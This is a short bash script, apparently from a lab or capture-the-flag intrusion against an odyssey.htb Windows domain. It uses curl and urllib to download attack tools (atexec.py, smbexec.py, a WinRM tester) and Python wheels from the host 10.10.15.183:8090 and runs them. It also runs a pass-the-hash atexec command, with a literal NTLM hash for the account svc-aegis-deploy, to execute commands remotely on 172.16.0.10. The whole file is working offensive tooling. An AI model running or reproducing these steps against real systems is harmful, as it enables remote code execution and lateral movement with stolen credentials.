#!/bin/bash
export PYTHONPATH=/tmp/pylibs
# re-extract wheels cleanly via script file
python3 - <<'PY'
import zipfile, pathlib, shutil, os
root=pathlib.Path('/tmp/adwheels')
pylibs=pathlib.Path('/tmp/pylibs')
if not list(root.glob('*.whl')):
    import urllib.request
    urllib.request.urlretrieve('http://10.10.15.183:8090/adwheels.tgz','/tmp/adwheels.tgz')
    import tarfile
    pathlib.Path('/tmp/adwheels').mkdir(exist_ok=True)
    tarfile.open('/tmp/adwheels.tgz').extractall('/tmp/adwheels')
shutil.rmtree(pylibs, ignore_errors=True)
pylibs.mkdir()
for w in root.glob('*.whl'):
    zipfile.ZipFile(w).extractall(pylibs)
for name in ['cffi','cryptography','bcrypt','nacl']:
    for p in pylibs.glob(name+'*'):
        if p.is_dir(): shutil.rmtree(p, ignore_errors=True)
        else: p.unlink(missing_ok=True)
print('libs ready', len(list(pylibs.iterdir())))
PY
curl -fsSL -o /tmp/winrm_test.py http://10.10.15.183:8090/winrm_test.py
curl -fsSL -o /tmp/atexec.py http://10.10.15.183:8090/atexec.py
curl -fsSL -o /tmp/smbexec.py http://10.10.15.183:8090/smbexec.py
python3 /tmp/winrm_test.py 2>&1 | tee /tmp/winrm_test.out
echo '--- atexec ---'
python3 /tmp/atexec.py -hashes :3a5026b2aa5ef2cbb7cb6a7be3a2bcfa odyssey.htb/svc-aegis-deploy@172.16.0.10 whoami 2>&1 | tee /tmp/atexec.out | tail -20
echo WINRM_ATTEMPT_DONE
